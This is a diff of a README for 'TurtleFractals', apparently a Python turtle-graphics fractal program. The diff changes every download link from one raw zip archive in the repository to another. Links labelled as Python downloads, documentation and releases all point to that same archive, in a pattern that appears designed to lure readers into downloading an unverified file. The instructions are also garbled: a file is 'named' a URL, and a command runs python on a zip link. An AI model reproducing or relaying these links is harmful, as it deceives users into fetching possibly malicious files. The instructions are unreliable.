@@ -1,6 +1,6 @@
 # 🐢 TurtleFractals - Create Beautiful Fractals Instantly
 
-[![Download TurtleFractals](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)
+[![Download TurtleFractals](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip)](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip)
 
 ## 📜 Description
 
@@ -12,17 +12,17 @@ TurtleFractals is a user-friendly application that allows you to plot stunning f
 
 Before you download TurtleFractals, ensure you have the following on your device:
 - **Operating System:** Windows, macOS, or Linux
-- **Python Version:** 3.6 or higher (If you do not have Python installed, please download it from [https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip))
+- **Python Version:** 3.6 or higher (If you do not have Python installed, please download it from [https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip))
 - **Turtle Graphics Library:** This library comes with Python, so no extra installation is needed.
 
 ### 2. Download & Install
 
-To get TurtleFractals, visit this page to download: [TurtleFractals Releases](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip).
+To get TurtleFractals, visit this page to download: [TurtleFractals Releases](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip).
 
 1. Click on the link above.
 2. You will see a list of available releases.
 3. Find the latest version listed at the top.
-4. Click on the `.zip` or `https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip` file to download it to your computer.
+4. Click on the `.zip` or `https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip` file to download it to your computer.
 
 After downloading, extract the contents to a folder on your device. 
 
@@ -31,11 +31,11 @@ After downloading, extract the contents to a folder on your device.
 To plot fractals:
 
 1. Open the folder where you extracted TurtleFractals.
-2. Look for the file named `https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip`.
+2. Look for the file named `https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip`.
 3. Double-click this file if you are using Windows, or run it from your terminal or command prompt using the command:
 
    ```bash
-   python https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip
+   python https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip
    ```
 
 ### 4. Using TurtleFractals
@@ -69,7 +69,7 @@ If you have any questions or need help, feel free to open an issue on the GitHub
 ## 🔗 Additional Resources 
 
 You may find these links helpful:
-- [Python Downloads](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)
-- [Turtle Graphics Documentation](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)
+- [Python Downloads](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip)
+- [Turtle Graphics Documentation](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/Fractal Ferns/Fractals-Turtle-1.1.zip)
 
 Feel free to explore the code on GitHub and contribute if you wish! Thank you for using TurtleFractals. Happy fractal plotting!
